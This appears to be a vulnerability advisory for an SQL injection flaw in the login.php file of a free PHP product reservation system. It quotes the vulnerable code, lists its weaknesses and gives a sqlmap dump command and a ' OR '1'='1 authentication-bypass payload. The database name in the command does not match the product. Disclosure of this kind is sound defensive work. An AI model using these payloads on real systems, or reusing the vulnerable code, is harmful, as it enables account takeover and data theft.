# SQL Injection Vulnerability in login.php (User Authentication)

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)

**Download Link**: https://code-projects.org/online-product-reservation-system-in-php-with-source-code/

**Vulnerable File**: app/user/login.php

**Version**: V1.0

**Description**:

A critical SQL injection vulnerability exists in the user login functionality. The application directly concatenates user input into SQL query without validation, allowing attackers to bypass authentication completely and extract sensitive user data.

### Analyse

**Vulnerability: SQL Injection in Authentication Query**

```php
<?php include('../../config/config.php'); ?>

<?php

session_start();

// Line 7-8: User input from POST without validation
$email = $_POST['emailadd'];
$pass = md5($_POST['pass']);

// Line 10: VULNERABLE! Direct concatenation into SELECT query
$login = mysql_query("SELECT * FROM users WHERE email = '$email' AND password = '$pass'") or die(mysql_error());

$_login = mysql_fetch_array($login);

echo  $_login['user_id'];

if($_login['email'] == $email )
{

$_SESSION['id'] = $_login['user_id'];
header("location: ../../index.php");
}else{
header("location: ../../err_log.php");
echo "username or password error";

}

?>
```

**Vulnerability Analysis**:

1. **Authentication Bypass**: Both email and password vulnerable to SQL injection
2. **No Input Validation**: User input directly concatenated into SQL query
3. **Weak Password Hashing**: Uses MD5 (cryptographically broken)
4. **No Prepared Statements**: Uses deprecated `mysql_query()` function
5. **Error Disclosure**: MySQL errors directly displayed to user
6. **Plaintext Password Equivalent**: MD5 hashes can be bypassed with SQL injection

### POC

```bash
sqlmap -u "http://localhost:8081/app/user/login.php" \
  --data="emailadd=test@example.com&pass=password&login=Login" \
  --batch \
  -D cj_handgunner \
  -T admin_login \
  --dump
```

![1767438150534.png](https://youke3.picui.cn/s1/2026/01/03/6958f7133f686.png)

**Authentication Bypass Payload**:
```bash
# Bypass authentication with OR logic
emailadd=' OR '1'='1&pass=anyvalue
```

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- CWE-287: https://cwe.mitre.org/data/definitions/287.html (Improper Authentication)
